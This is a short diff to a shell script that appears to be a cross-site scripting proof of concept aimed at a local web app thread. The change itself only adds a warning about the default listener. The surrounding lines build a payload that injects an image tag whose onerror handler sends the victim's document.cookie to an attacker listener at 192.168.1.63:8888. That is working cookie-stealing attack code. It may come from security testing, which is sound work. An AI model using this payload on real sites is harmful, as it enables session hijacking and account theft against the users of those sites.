@@ -7,6 +7,9 @@ set -euo pipefail
 BASE="${1:-http://localhost:4942}"
 THREAD="${2:-bbeo32ucx0a65b8}"
 LISTENER="${3:-192.168.1.63:8888}"
+if [ -z "${3:-}" ]; then
+  echo "[!] using default listener $LISTENER — pass your own host as argument 3"
+fi
 JAR="${4:-cookies_jdoe.txt}"
 
 PAYLOAD="<img src=x onerror=\"fetch('http://${LISTENER}/xss-hit?c='+encodeURIComponent(document.cookie))\">"
